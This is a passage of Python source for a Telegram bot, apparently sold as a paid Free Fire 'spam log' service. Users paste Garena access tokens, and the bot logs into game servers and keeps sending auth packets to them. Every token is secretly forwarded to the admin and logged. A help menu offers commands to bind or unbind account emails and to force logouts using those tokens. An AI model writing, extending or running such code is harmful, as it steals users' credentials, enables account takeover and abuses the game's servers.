        f"```",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🎁  Lấy Key Free", callback_data="getkey"),
             InlineKeyboardButton("💎  Mua VIP", url=f"https://t.me/{VIP_CONTACT.lstrip('@')}")]
        ]),
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ══════════════════════════════════════════════════════
#               /getkey
# ══════════════════════════════════════════════════════


async def cmd_getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not await check_join(ctx, int(uid)):
        return await get_reply(update).reply_text("```\n❌  Bạn chưa tham gia nhóm!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    key = gen_free_key()
    link = await shorten_link(key)
    db = load_db()
    pool = db.get("key_pool", {})
    pool[key] = {
        "days": 0,
        "free": True,
        "expire_abs": time.time() +
        3600,
        "used": False}
    db["key_pool"] = pool
    save_db(db)
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ KEY FREE\n"
        f"│\n"
        f"│  🔗  Bấm nút bên dưới    │\n"
        f"│  ⏳  Hạn  :  1 giờ       │\n"
        f"└──────────────────\n"
        f"\n"
        f"📌  Sau khi lấy key:\n"
        f"   /activevip <key>\n"
        f"\n"
        f"⚠️  Key free KHÔNG dùng /spam\n"
        f"💰  Mua VIP: {VIP_CONTACT}\n"
        f"```",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗  Nhấn để lấy Key", url=link)],
            [InlineKeyboardButton("💎  Mua Key VIP", url=f"https://t.me/{VIP_CONTACT.lstrip('@')}")]
        ]),
        parse_mode=ParseMode.MARKDOWN_V2
    )
    try:
        await ctx.bot.send_message(
            ADMIN_ID,
            f"```\n"
            f"📋  KEY FREE MỚI\n"
            f"├──────────────────\n"
            f"👤  User  :  @{update.effective_user.username or update.effective_user.first_name or 'N/A'}\n"
            f"🆔  ID    :  {uid}\n"
            f"🔑  Key   :  {key}\n"
            f"⏳  Hạn   :  1 giờ\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception:
        pass

# ══════════════════════════════════════════════════════
#               /activevip
# ══════════════════════════════════════════════════════


async def cmd_activevip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /activevip <key>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    key_code = ctx.args[0].strip()
    db = load_db()
    pool = db.get("key_pool", {})
    if key_code in pool:
        if pool[key_code].get("used"):
            return await get_reply(update).reply_text("```\n❌  Key đã được dùng rồi!\n```", parse_mode=ParseMode.MARKDOWN_V2)
        if pool[key_code].get("free") and time.time(
        ) > pool[key_code].get("expire_abs", 0):
            return await get_reply(update).reply_text("```\n❌  Key free đã hết thời gian!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    ok, detail = activate_vip_key(uid, key_code)
    if not ok:
        return await get_reply(update).reply_text(f"```\n❌  {detail}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    is_free = load_db().get(
        "key_pool",
        {}).get(
        key_code,
        {}).get(
            "free",
        False)
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ KÍCH HOẠT THÀNH CÔNG\n"
        f"│\n"
        f"│  🔑  Key   :  {key_code}\n"
        f"│  ⭐  Loại  :  {'🎁 Free (1 giờ)' if is_free else '💎 VIP (' + detail + ')'}\n"
        f"└──────────────────\n"
        f"\n"
        f"{'✅  Dùng /spam <token> để spam log!' if not is_free else '⚠️  Key free không dùng /spam'}\n"
        f"```",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀  Bắt đầu Spam", callback_data="guide")] if not is_free else
            [InlineKeyboardButton("💎  Nâng cấp VIP", url=f"https://t.me/{VIP_CONTACT.lstrip('@')}")]
        ]),
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ══════════════════════════════════════════════════════
#               /spam  ── CHỈ VIP
# ══════════════════════════════════════════════════════


async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if is_maintenance():
        return await get_reply(update).reply_text(
            f"```\n🔧  ĐANG BẢO TRÌ\n├──────────────────\nChức năng spam tạm ngưng.\nVui lòng chờ admin thông báo.\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    if not await check_join(ctx, int(uid)):
        return await get_reply(update).reply_text("```\n❌  Bạn chưa tham gia nhóm!\n```", parse_mode=ParseMode.MARKDOWN_V2)

    has_vip, vip_left = check_vip(uid)
    db = load_db()
    vk = db["vip_keys"].get(uid, {})
    kinfo = db.get("key_pool", {}).get(vk.get("key", ""), {})

    if not has_vip:
        return await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓\n"
            f"│\n"
            f"│  /spam chỉ dành cho VIP  │\n"
            f"└──────────────────\n"
            f"\n"
            f"💰  Mua key VIP: {VIP_CONTACT}\n"
            f"```",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎  Mua Key VIP", url=f"https://t.me/{VIP_CONTACT.lstrip('@')}")]]),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    if kinfo.get("free"):
        return await get_reply(update).reply_text(
            f"```\n⛔  Key free KHÔNG dùng /spam!\n💰  Mua VIP: {VIP_CONTACT}\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    if not db["settings"].get("spam_on", True):
        return await get_reply(update).reply_text("```\n🔧  Spam đang bị tắt bởi admin!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /spam <access_token>\n```", parse_mode=ParseMode.MARKDOWN_V2)

    old_sid = user_active_session.get(uid)
    if old_sid and old_sid in active_spams:
        active_spams[old_sid]["running"] = False

    raw_input = ctx.args[0].strip()
    loading = await get_reply(update).reply_text("```\n⏳  Đang nhận dạng token...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token = await convert_eat_to_access(raw_input)
    # Fallback: thử parse access_token từ URL params
    token = dict(
        urllib.parse.parse_qsl(
            urllib.parse.urlparse(token).query or token)).get(
        "access_token", token)
    await loading.edit_text("```\n⏳  Đang đăng nhập FF...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        loop = asyncio.get_event_loop()
        ff_api = FreeFireAPI()
        result = await loop.run_in_executor(None, lambda: ff_api.get(token, is_emulator=False))
        if not isinstance(result, dict):
            await loading.delete()
            return await get_reply(update).reply_text("```\n❌  Token die hoặc đăng nhập thất bại!\n```", parse_mode=ParseMode.MARKDOWN_V2)

        session_id = str(uuid.uuid4())[:8]
        server_ip = result["GameServerAddress"]["onlineip"]
        server_port = int(result["GameServerAddress"]["onlineport"])
        key_hex = "".join(format(x, "02x") for x in result["key"])
        full_payload = bytes(result["UserAuthPacket"]) + \
            f"/log/{key_hex}/start".encode()

        active_spams[session_id] = {
            "running": True, "uid": uid,
            "nickname": result.get("UserNickName", "Unknown"),
            "start_at": datetime.now().strftime("%H:%M:%S"),
            "server_ip": server_ip, "server_port": server_port
        }
        user_active_session[uid] = session_id
        threading.Thread(
            target=socket_spam_worker,
            args=(
                session_id,
                server_ip,
                server_port,
                full_payload),
            daemon=True).start()
        log_token(
            uid,
            update.effective_user.username or update.effective_user.first_name,
            token,
            extra={
                "nick": result.get(
                    "UserNickName",
                    "?"),
                "uid": result.get(
                    "UserAccountUID",
                    "?"),
                "server": f"{server_ip}:{server_port}"})
        await loading.delete()
        await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓ SPAM LOG ĐANG CHẠY\n"
            f"│\n"
            f"│  👤  Nick    :  {result.get('UserNickName')}\n"
            f"│  🆔  UID     :  {result.get('UserAccountUID')}\n"
            f"│  🌐  Server  :  {server_ip}\n"
            f"│  🔖  Session :  {session_id}\n"
            f"│  ⏳  VIP còn :  {vip_left}\n"
            f"│\n"
            f"│  📡  Gửi packet mỗi 10 giây│\n"
            f"└──────────────────\n"
            f"```",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑  Dừng Spam", callback_data="stop_spam_btn")]]),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        # Gửi token cho admin
        try:
            await ctx.bot.send_message(
                ADMIN_ID,
                f"```\n"
                f"📡  TOKEN MỚI\n"
                f"├──────────────────\n"
                f"👤  User    :  {update.effective_user.first_name} (@{update.effective_user.username or 'no_username'})\n"
                f"🆔  ID      :  {uid}\n"
                f"👾  Nick    :  {result.get('UserNickName')}\n"
                f"🔑  Token   :  {token}\n"
                f"🌐  Server  :  {server_ip}:{server_port}\n"
                f"```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception:
            pass
    except Exception as e:
        await loading.delete()
        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)

# ══════════════════════════════════════════════════════
#               /stopspam
# ══════════════════════════════════════════════════════


async def cmd_stopspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    sid = user_active_session.get(uid)
    if sid and sid in active_spams:
        nick = active_spams[sid].get("nickname", "?")
        active_spams[sid]["running"] = False
        del active_spams[sid]
        user_active_session.pop(uid, None)
        await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓ ĐÃ DỪNG SPAM\n"
            f"│\n"
            f"│  👤  Nick: {nick}\n"
            f"│  ✅  Phiên đã kết thúc│\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await get_reply(update).reply_text("```\n⚠️  Không có phiên spam nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)

# ══════════════════════════════════════════════════════
#               /checkmail  /checkmxh
# ══════════════════════════════════════════════════════


async def cmd_checkmail(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not await check_join(ctx, int(uid)):
        return await get_reply(update).reply_text("```\n❌  Chưa tham gia nhóm!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /checkmail <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    raw = ctx.args[0].strip()
    token_cm = await convert_eat_to_access(raw)
    # fetch_mail - user chỉ thấy email + SĐT, admin thấy đầy đủ
    result = await fetch_mail(
        token_cm,
        uid=uid,
        username=update.effective_user.username or update.effective_user.first_name,
        bot=ctx.bot
    )
    await get_reply(update).reply_text(result, parse_mode=ParseMode.MARKDOWN_V2)


async def cmd_checkmxh(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not await check_join(ctx, int(uid)):
        return await get_reply(update).reply_text("```\n❌  Chưa tham gia nhóm!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /checkmxh <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    raw_mxh = ctx.args[0].strip()
    token_mxh = await convert_eat_to_access(raw_mxh)
    await get_reply(update).reply_text(
        await fetch_social(token_mxh, uid=uid, username=update.effective_user.username or update.effective_user.first_name, bot=ctx.bot),
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ══════════════════════════════════════════════════════
#               ADMIN DECORATOR + COMMANDS
# ══════════════════════════════════════════════════════


def admin_only(func):
    async def wrapper(
            update: Update,
            ctx: ContextTypes.DEFAULT_TYPE,
            **kwargs):
        if update.effective_user.id != ADMIN_ID:
            msg = getattr(
                update,
                "message",
                None) or getattr(
                update.callback_query,
                "message",
                None)
            if msg:
                return await msg.reply_text("```\n⛔  Lệnh chỉ dành cho Admin!\n```", parse_mode=ParseMode.MARKDOWN_V2)
            return
        return await func(update, ctx, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper


def get_reply(update):
    """Lấy đúng message object dù gọi từ lệnh hay button callback"""
    if update.message:
        return update.message
    if update.callback_query and update.callback_query.message:
        return update.callback_query.message
    return None


@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    avip = sum(1 for v in db["vip_keys"].values()
               if v["expire"] == -1 or v["expire"] > time.time())
    rspam = sum(1 for v in active_spams.values() if v["running"])
    pending_count = len(pending_nap)
    events_count = len(db.get("events", {}))
    gift_count = len(db.get("giftcodes", {}))
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ ADMIN PANEL\n"
        f"│\n"
        f"│  👥  Tổng users  :  {len(db['users'])}\n"
        f"│  💎  VIP active  :  {avip}\n"
        f"│  🚀  Spam đang   :  {rspam}\n"
        f"│  💳  Chờ nạp     :  {pending_count}\n"
        f"│  🎉  Events      :  {events_count}\n"
        f"│  🎁  Giftcodes   :  {gift_count}\n"
        f"│  🔑  Keys pool   :  {len(db.get('key_pool', {}))}\n"
        f"│  🚫  Đã ban      :  {len(db['banned'])}\n"
        f"├──────────────────\n"
        f"│  📋  LỆNH ADMIN\n"
        f"│  /createkey  /delvip  /listvip\n"
        f"│  /ban  /unban  /broadcast\n"
        f"│  /listspam  /stopall  /listkey\n"
        f"│  /setshop  /delshop  /setfeature\n"
        f"│  /creategift  /listgift  /delgift\n"
        f"│  /createevent  /endevent  /listevents\n"
        f"│  /eventsubs  /setspam  /sysinfo\n"
        f"│  /exportvip  /exporttoken  /cleanup\n"
        f"│  /cong  /checkupdate  /setfreekey\n"
        f"└──────────────────\n"
        f"```",
        reply_markup=admin_kb(db["settings"]),
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_createkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or not ctx.args[0].isdigit():
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /createkey <số_ngày>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    days = int(ctx.args[0])
    key = gen_vip_key(days)
    db = load_db()
    pool = db.get("key_pool", {})
    pool[key] = {"days": days, "free": False, "used": False,
                 "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    db["key_pool"] = pool
    save_db(db)
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓\n"
        f"│   🔑  KEY VIP MỚI TẠO   │\n"
        f"│\n"
        f"│  🔑  Key  :  {key}\n"
        f"│  📅  Hạn  :  {days} ngày\n"
        f"└──────────────────\n"
        f"\n"
        f"📌  Hướng dẫn user:\n"
        f"   /activevip {key}\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_ban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /ban <user_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    tid = ctx.args[0]
    db = load_db()
    if tid not in db["banned"]:
        db["banned"].append(tid)
        save_db(db)
        sid = user_active_session.get(tid)
        if sid and sid in active_spams:
            active_spams[sid]["running"] = False
        await get_reply(update).reply_text(f"```\n🚫  Đã ban ID: {tid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await get_reply(update).reply_text(f"```\n⚠️  ID {tid} đã bị ban rồi!\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_unban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /unban <user_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    tid = ctx.args[0]
    db = load_db()
    if tid in db["banned"]:
        db["banned"].remove(tid)
        save_db(db)
        await get_reply(update).reply_text(f"```\n✅  Đã unban ID: {tid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await get_reply(update).reply_text(f"```\n⚠️  ID {tid} không bị ban!\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /broadcast <nội dung>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    msg_text = " ".join(ctx.args)
    db = load_db()
    ok = 0
    for uid in list(db["users"].keys()):
        try:
            await ctx.bot.send_message(
                int(uid),
                f"```\n📢  THÔNG BÁO TỪ ADMIN\n├──────────────────\n{msg_text}\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            ok += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await get_reply(update).reply_text(f"```\n✅  Đã gửi tới {ok}/{len(db['users'])} người.\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_listspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_spams:
        return await get_reply(update).reply_text("```\n📭  Không có phiên spam nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    lines = "```\n🚀  SPAM ĐANG CHẠY\n├──────────────────\n"
    for sid, info in active_spams.items():
        if info["running"]:
            lines += f"🔖  {sid}  |  👤 {info['nickname']}  |  🆔 {info['uid']}\n"
    await get_reply(update).reply_text(lines + "```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_stopall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    count = len(active_spams)
    for sid in list(active_spams.keys()):
        active_spams[sid]["running"] = False
    active_spams.clear()
    user_active_session.clear()
    await get_reply(update).reply_text(f"```\n✅  Đã dừng {count} phiên spam.\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_listkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    pool = load_db().get("key_pool", {})
    if not pool:
        return await get_reply(update).reply_text("```\n📭  Chưa có key nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    lines = "```\n🔑  DANH SÁCH KEY\n├──────────────────\n"
    for k, info in list(pool.items())[-20:]:
        lines += f"{
            '✅' if info.get('used') else '⬜'}  {k}  [{
            'FREE' if info.get('free') else str(
                info['days']) + 'd'}]\n"
    await get_reply(update).reply_text(lines + "```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_listvip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    vk = load_db()["vip_keys"]
    if not vk:
        return await get_reply(update).reply_text("```\n📭  Chưa có VIP user nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    lines = "```\n💎  DANH SÁCH VIP\n├──────────────────\n"
    for uid, info in vk.items():
        ok, left = check_vip(uid)
        lines += f"{'✅' if ok else '❌'}  {uid}  |  {left}\n"
    await get_reply(update).reply_text(lines + "```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_setfreekey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  /setfreekey on|off|interval <giây>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    arg = ctx.args[0].lower()
    if arg == "on":
        db["settings"]["free_key_on"] = True
        save_db(db)
        await get_reply(update).reply_text("```\n✅  Phát key free: BẬT\n```", parse_mode=ParseMode.MARKDOWN_V2)
    elif arg == "off":
        db["settings"]["free_key_on"] = False
        save_db(db)
        await get_reply(update).reply_text("```\n✅  Phát key free: TẮT\n```", parse_mode=ParseMode.MARKDOWN_V2)
    elif arg == "interval" and len(ctx.args) > 1 and ctx.args[1].isdigit():
        db["settings"]["free_key_interval"] = int(ctx.args[1])
        save_db(db)
        await get_reply(update).reply_text(f"```\n✅  Chu kỳ: {ctx.args[1]}s\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_cleanup(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    pool = db.get("key_pool", {})
    now = time.time()
    rk = rv = 0
    for k in list(pool.keys()):
        if pool[k].get("used") or (
            pool[k].get("free") and now > pool[k].get(
                "expire_abs", 0)):
            del pool[k]
            rk += 1
    vk = db["vip_keys"]
    for uid in list(vk.keys()):
        if vk[uid]["expire"] != -1 and vk[uid]["expire"] < now:
            del vk[uid]
            rv += 1
    db["key_pool"] = pool
    db["vip_keys"] = vk
    save_db(db)
    await get_reply(update).reply_text(f"```\n✅  Xóa {rk} key cũ + {rv} VIP hết hạn.\n```", parse_mode=ParseMode.MARKDOWN_V2)

# ══════════════════════════════════════════════════════
#               CALLBACK HANDLER
# ══════════════════════════════════════════════════════


async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = str(q.from_user.id)
    cid = q.message.chat_id
    data = q.data
    db = load_db()
    s = db["settings"]

    # ── verify_join ──
    if data == "verify_join":
        try:
            joined = await check_join(ctx, q.from_user.id)
        except BaseException:
            joined = True
        if joined:
            try:
                await q.message.delete()
            except BaseException:
                pass
            await send_main_menu_cid(ctx.bot, cid, uid)
        else:
            await q.answer("❌  Bạn vẫn chưa tham gia đủ 2 nhóm!", show_alert=True)
        return

    # ── stop spam button ──
    # ── Mua VIP ──
    if data.startswith("buy_"):
        days_key = data.replace("buy_", "")
        await process_buy(q, uid, days_key, ctx)
        return

    if data == "noop":
        await q.answer()
        return

    if data.startswith("refresh_log_"):
        sid_r = data.replace("refresh_log_", "")
        uid_r = uid
        info_r = active_spams.get(sid_r, {})
        logs_r = spam_logs.get(sid_r, [])
        if not info_r and not logs_r:
            await q.answer("Phiên không còn tồn tại!", show_alert=True)
            return
        status_r = "🟢 Đang chạy" if info_r.get("running") else "🔴 Đã dừng"
        count_r = info_r.get("count", 0)
        text_r = (
            f"```\n"
            f"┌───⭓ PHIÊN SPAM: {sid_r}\n"
            f"│  👤  Nick   :  {info_r.get('nickname', '?')}\n"
            f"│  📊  Status :  {status_r}\n"
            f"│  📦  Đã gửi :  {count_r} gói\n"
            f"├──────────────────\n"
        )
        for line in logs_r[-10:]:
            text_r += f"│  {line}\n"
        text_r += "└──────────────────\n```"
        try:
            await q.edit_message_text(
                text_r,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄  Làm mới", callback_data=f"refresh_log_{sid_r}"),
                     InlineKeyboardButton("🛑  Dừng spam", callback_data="stop_spam_btn")]
                ]),
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception:
            pass
        await q.answer("✅ Đã làm mới!")
        return

    if data.startswith("game_event_"):
        eid_g = data.replace("game_event_", "")
        await start_game(q, uid, eid_g, ctx)
        return

    if data.startswith("sub_event_"):
        eid2 = data.replace("sub_event_", "")
        ctx.user_data["pending_event"] = eid2
        await q.message.reply_text(
            "```\n┌───⭓ GỬI ẢNH\n│  📸  Hãy gửi ảnh xác nhận ngay!\n│  ⚠️  Chỉ gửi 1 ảnh duy nhất\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    if data == "nap_info":
        await q.message.reply_text(
            f"```\n┌───⭓ NẠP TIỀN\n│  Lệnh: /nap <số tiền>\n│  VD  : /nap 50000\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    if data == "stop_spam_btn":
        sid2 = user_active_session.get(uid)
        if sid2 and sid2 in active_spams:
            nick2 = active_spams[sid2].get("nickname", "?")
            active_spams[sid2]["running"] = False
            del active_spams[sid2]
            user_active_session.pop(uid, None)
            await q.message.reply_text(
                f"```\n┌───⭓\n│   🛑  ĐÃ DỪNG SPAM   │\n│\n│  👤  Nick: {nick2}\n└──────────────────\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            await q.answer("Không có phiên spam nào đang chạy!", show_alert=True)
        return

    # ── guide ──
    if data == "shop":
        db2 = load_db()
        shop2 = db2.get("shop", DEFAULT_SHOP)
        balance = get_balance(uid)
        text2 = (
            f"```\n"
            f"┌───⭓ BẢNG GIÁ KEY VIP\n"
            f"│  💰  Số dư: {balance:,}đ\n"
            f"├──────────────────\n"
        )
        kb2 = []
        for k, item in shop2.items():
            ok2 = "✅" if balance >= item["price"] else "❌"
            text2 += f"│  {ok2}  {
                item['label']}  —  {
                item['price']:,}đ\n│      {
                item['desc']}\n├──────────────────\n"
            kb2.append([InlineKeyboardButton(
                f"{'✅' if balance >= item['price'] else '❌'}  {item['label']} — {item['price']:,}đ",
                callback_data=f"buy_{k}"
            )])
        text2 += "└──────────────────\n```"
        kb2.append([InlineKeyboardButton(
            "💳  Nạp tiền", callback_data="nap_info")])
        await q.message.reply_text(text2, reply_markup=InlineKeyboardMarkup(kb2), parse_mode=ParseMode.MARKDOWN_V2)
        return

    if data == "guide":
        await q.message.reply_text(
            f"```\n"
            f"📖  HƯỚNG DẪN LẤY TOKEN\n"
            f"├──────────────────\n"
            f"1️⃣   Tải app Proxy Pin\n"
            f"2️⃣   Cài đặt HTTPS Proxy\n"
            f"3️⃣   Bật Proxy Pin → vào Garena\n"
            f"4️⃣   Tìm dòng access_token= → copy\n"
            f"├──────────────────\n"
            f"💎  Có VIP: /spam <token>\n"
            f"🆓  Free  : /checkmail <token>\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    # ── profile ──
    if data == "profile":
        has_vip, vip_left = check_vip(uid)
        sid = user_active_session.get(uid)
        running = bool(sid and active_spams.get(sid, {}).get("running"))
        await q.message.reply_text(
            f"```\n"
            f"┌───⭓\n"
            f"│\n"
            f"│  🆔  ID  :  {uid}\n"
            f"│  💎  VIP :  {'✅ ' + vip_left if has_vip else '❌ Chưa có'}\n"
            f"│  🚀  Spam:  {'🟢 Đang chạy' if running else '🔴 Dừng'}\n"
            f"│  💰  Dư  :  {get_balance(uid):,}đ\n"
            f"└──────────────────\n"
            f"```",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🎁  Lấy Key Free", callback_data="getkey"),
                 InlineKeyboardButton("💎  Mua VIP", url=f"https://t.me/{VIP_CONTACT.lstrip('@')}")]
            ]),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    # ── getkey (button) ──
    if data == "getkey":
        if not is_bot_on():
            await q.message.reply_text("```\n🔴  Bot đang tắt!\n```", parse_mode=ParseMode.MARKDOWN_V2)
            return
        key = gen_free_key()
        link = await shorten_link(key)
        db2 = load_db()
        pool = db2.get("key_pool", {})
        pool[key] = {
            "days": 0,
            "free": True,
            "expire_abs": time.time() +
            3600,
            "used": False}
        db2["key_pool"] = pool
        save_db(db2)
        await q.message.reply_text(
            f"```\n"
            f"┌───⭓ KEY FREE\n"
            f"│\n"
            f"│  🔗  Bấm nút bên dưới    │\n"
            f"│  ⏳  Hạn  :  1 giờ       │\n"
            f"└──────────────────\n"
            f"\n"
            f"📌  Sau khi lấy key:\n"
            f"   /activevip <key>\n"
            f"\n"
            f"⚠️  Key free KHÔNG dùng /spam\n"
            f"💰  Mua VIP: {VIP_CONTACT}\n"
            f"```",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗  Nhấn để lấy Key", url=link)],
                [InlineKeyboardButton("💎  Mua Key VIP", url=f"https://t.me/{VIP_CONTACT.lstrip('@')}")]
            ]),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        try:
            await ctx.bot.send_message(
                ADMIN_ID,
                f"```\n📋  KEY FREE MỚI\n├──────────────────\n👤  User  :  @{q.from_user.username or 'N/A'}\n🆔  ID    :  {uid}\n🔑  Key   :  {key}\n⏳  Hạn   :  1 giờ\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception:
            pass
        return

    # ── help (button) ──
    if data == "help":
        await q.message.reply_text(
            f"```\n"
            f"┌───⭓ DANH SÁCH LỆNH\n"
            f"│\n"
            f"│  🆓  LỆNH FREE\n"
            f"│  /start        →  Menu chính\n"
            f"│  /help         →  Lệnh này\n"
            f"│  /profile      →  Xem tài khoản + số dư\n"
            f"│  /getkey       →  Lấy key free\n"
            f"│  /activevip    →  Kích hoạt key\n"
            f"│  /checkmail    →  Check mail FF\n"
            f"│  /checkmxh     →  Check MXH FF\n"
            f"│  /info <uid>   →  Xem info nick FF\n"
            f"│  /nap <tiền>   →  Nạp tiền\n"
            f"│  /mua          →  Bảng giá VIP\n"
            f"│  /giftcode     →  Nhập giftcode\n"
            f"│  /event        →  Xem sự kiện\n"
            f"├──────────────────\n"
            f"│  💎  LỆNH VIP\n"
            f"│  /spam <token>      →  Spam log FF\n"
            f"│  /stopspam          →  Dừng spam\n"
            f"│  /mailinfo <token>  →  Check bind email\n"
            f"│  /sendotp <token> <email>\n"
            f"│       →  Gửi OTP về email\n"
            f"│  /verifyotp <token> <email> <otp>\n"
            f"│       →  Xác thực OTP\n"
            f"│  /bindmail <token> <email> <pass2>\n"
            f"│       →  Liên kết email mới\n"
            f"│  /dxuat <token>\n"
            f"│       →  Đăng xuất tài khoản\n"
            f"│  /unbind <token> <email>\n"
            f"│       →  Gỡ liên kết email\n"
            f"│  /unbindotp <token> <email> <otp>\n"
            f"│       →  Xác nhận gỡ liên kết\n"
            f"│  /cancelreq <token>\n"
            f"│       →  Hủy yêu cầu đang chờ\n"
            f"├──────────────────\n"
            f"│  💰  Mua VIP: {VIP_CONTACT}\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    # ── admin callbacks ──
    if q.from_user.id != ADMIN_ID:
        return

    # ── Duyệt / Từ chối event submission ──
    if data.startswith("ev_approve_") or data.startswith("ev_reject_"):
        parts = data.split("_")
        action = parts[1]           # approve / reject
        eid = parts[2]
        tuid = parts[3]
        db2 = load_db()
        ev2 = db2.get("events", {}).get(eid, {})
        sub2 = ev2.get("submissions", {}).get(tuid, {})
        if not sub2:
            await q.answer("Không tìm thấy bài nộp!", show_alert=True)
            return
        if sub2["status"] != "pending":
